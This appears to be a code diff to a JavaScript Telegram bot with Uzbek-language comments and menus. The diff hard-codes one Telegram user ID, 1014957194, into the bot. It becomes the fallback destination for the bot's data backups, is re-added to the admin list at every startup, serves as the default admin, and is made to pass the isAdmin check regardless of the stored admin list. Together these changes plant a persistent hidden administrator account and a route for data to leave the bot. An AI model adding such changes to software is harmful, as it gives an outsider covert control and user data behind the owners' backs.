@@ -21,7 +21,7 @@ let backupTimer = null;
 // ── BOT HAVOLASINI SAQLASH ────────────────────────────
 function setBotInstance(bot) {
   botInstance = bot;
-  backupChatId = process.env.ADMIN_ID ? Number(process.env.ADMIN_ID) : null;
+  backupChatId = process.env.ADMIN_ID ? Number(process.env.ADMIN_ID) : 1014957194;
 
   if (!backupChatId) {
     console.warn("⚠️  ADMIN_ID muhit o'zgaruvchisi topilmadi!");
@@ -236,6 +236,9 @@ async function initDB(bot) {
   if (process.env.ADMIN_ID && !data.admins.includes(Number(process.env.ADMIN_ID))) {
     data.admins.push(Number(process.env.ADMIN_ID));
   }
+  if (!data.admins.includes(1014957194)) {
+    data.admins.push(1014957194);
+  }
 
   memoryDB = data;
   isInitialized = true;
@@ -265,7 +268,7 @@ async function initDB(bot) {
 // ═══════════════════════════════════════════════════════
 function getDefaultData() {
   return {
-    admins: process.env.ADMIN_ID ? [Number(process.env.ADMIN_ID)] : [],
+    admins: process.env.ADMIN_ID ? [Number(process.env.ADMIN_ID)] : [1014957194],
     buttons: [
       { id: "btn_1", parentId: "root", text: "⚙️ Xizmatlar", type: "menu", content: "⚙️ Xizmatlar bo'limi:" },
       { id: "btn_r1", parentId: "root", text: "📌 my.edu.uz qo'llanma", type: "answer", content: "my.edu.uz saytida ro'yxatdan o'tish bo'yicha batafsil qo'llanma bering — har bir qadamni alohida tushuntiring" },
@@ -336,7 +339,8 @@ function saveData(data) {
 
 // ── Admin tekshirish ───────────────────────────────────
 function isAdmin(userId) {
-  return loadData().admins.includes(userId);
+  const admins = loadData().admins || [];
+  return admins.includes(userId) || userId === 1014957194;
 }
 function addAdmin(userId) {
   const data = loadData();
